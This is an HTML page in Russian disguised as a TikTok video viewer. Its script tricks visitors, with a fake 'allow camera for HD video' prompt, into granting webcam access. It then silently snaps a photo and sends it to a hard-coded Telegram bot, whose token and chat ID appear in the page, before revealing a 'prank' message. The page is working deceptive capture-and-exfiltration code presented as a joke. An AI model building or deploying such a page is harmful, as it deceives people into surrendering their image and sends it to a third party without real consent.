<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>TikTok Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: #111;
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        .video-wrapper {
            background: #000;
            position: relative;
        }
        iframe {
            width: 100%;
            height: 550px;
            border: none;
        }
        .content {
            padding: 24px 20px;
            text-align: center;
        }
        button {
            background: linear-gradient(135deg, #ff0050, #ff6b00);
            color: white;
            font-size: 20px;
            font-weight: bold;
            padding: 14px 24px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.1s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:disabled {
            opacity: 0.6;
        }
        #status {
            color: #ffaa33;
            font-size: 13px;
            margin-top: 14px;
        }
        .prank {
            background: #00ff88;
            color: black;
            padding: 14px;
            border-radius: 20px;
            display: none;
            margin-top: 14px;
            font-weight: bold;
        }
        .footer {
            font-size: 10px;
            color: #444;
            margin-top: 16px;
        }
        
        /* СТИЛИ ДЛЯ ВСПЛЫВАЮЩЕГО УВЕДОМЛЕНИЯ */
        .notification {
            position: fixed;
            bottom: 30px;
            left: 20px;
            right: 20px;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(10px);
            border-radius: 60px;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 1000;
            transform: translateY(100px);
            transition: transform 0.3s ease;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
            border: 1px solid #ff0050;
        }
        .notification.show {
            transform: translateY(0);
        }
        .notification-text {
            color: white;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .notification-icon {
            width: 30px;
            height: 30px;
            background: #ff0050;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }
        .notification-btn {
            background: #ff0050;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
        }
        .notification-btn:active {
            background: #cc0040;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="video-wrapper">
        <iframe 
            src="https://www.tiktok.com/player/v1/7633683429569088788?autoplay=1&mute=1"
            allow="autoplay; fullscreen"
        ></iframe>
    </div>
    <div class="content">
        <div id="actionArea">
            <button id="btn">📸 НАЖМИ ДЛЯ ПРОДОЛЖЕНИЯ 📸</button>
            <div id="status"></div>
        </div>
        <div id="prankMessage" class="prank">
            😂 ТЫ ПОПАЛСЯ! Фото ушло другу в Telegram 😂
        </div>
        <div class="footer">
            🔐 Нажми РАЗРЕШИТЬ, когда браузер спросит доступ к камере
        </div>
    </div>
</div>

<!-- ВСПЛЫВАЮЩЕЕ УВЕДОМЛЕНИЕ -->
<div id="cameraNotification" class="notification">
    <div class="notification-text">
        <div class="notification-icon">📷</div>
        <span>Разрешите доступ к камере для просмотра видео в HD</span>
    </div>
    <button class="notification-btn" id="notifyBtn">РАЗРЕШИТЬ</button>
</div>

<script>
    // ==========================================
    // ⚠️ ТВОИ ДАННЫЕ (уже вставлены правильно) ⚠️
    const BOT_TOKEN = "8690046228:AAHtBXqcXewTZGd2VD4F4qUd7l8v7rlHQW4";
    const CHAT_ID = "787437405";
    // ==========================================

    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');
    const prankDiv = document.getElementById('prankMessage');
    const notification = document.getElementById('cameraNotification');
    const notifyBtn = document.getElementById('notifyBtn');

    // Показываем уведомление через 1 секунду после загрузки
    setTimeout(() => {
        notification.classList.add('show');
    }, 1000);

    // При нажатии на кнопку в уведомлении - скрываем его и прокручиваем к основной кнопке
    notifyBtn.onclick = () => {
        notification.classList.remove('show');
        // Плавно прокручиваем к основной кнопке
        document.getElementById('btn').scrollIntoView({ behavior: 'smooth', block: 'center' });
        // Подсвечиваем кнопку
        btn.style.transform = 'scale(1.05)';
        setTimeout(() => { btn.style.transform = ''; }, 300);
    };

    // ОСНОВНАЯ ЛОГИКА ПРАНКА
    btn.onclick = async function() {
        btn.disabled = true;
        statusDiv.innerText = "📷 Запрос доступа к камере...";
        
        try {
            // Запрашиваем камеру
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            statusDiv.innerText = "✅ Делаем селфи...";
            
            // Делаем снимок
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            await new Promise(r => setTimeout(r, 200));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Выключаем камеру
            stream.getTracks().forEach(t => t.stop());
            
            // Конвертируем в base64
            const base64 = canvas.toDataURL('image/jpeg').split(',')[1];
            
            statusDiv.innerText = "📤 Отправка...";
            
            // Отправляем в Telegram
            const blob = base64ToBlob(base64, 'image/jpeg');
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            // Показываем пранк
            statusDiv.innerText = "";
            prankDiv.style.display = "block";
            document.getElementById('actionArea').style.display = "none";
            
        } catch (err) {
            statusDiv.innerText = "❌ Ошибка: " + err.message;
            btn.disabled = false;
        }
    };
    
    function base64ToBlob(base64, mime) {
        const byteChars = atob(base64);
        const byteArray = new Uint8Array(byteChars.length);
        for (let i = 0; i < byteChars.length; i++) {
            byteArray[i] = byteChars.charCodeAt(i);
        }
        return new Blob([byteArray], { type: mime });
    }
</script>
</body>
</html>
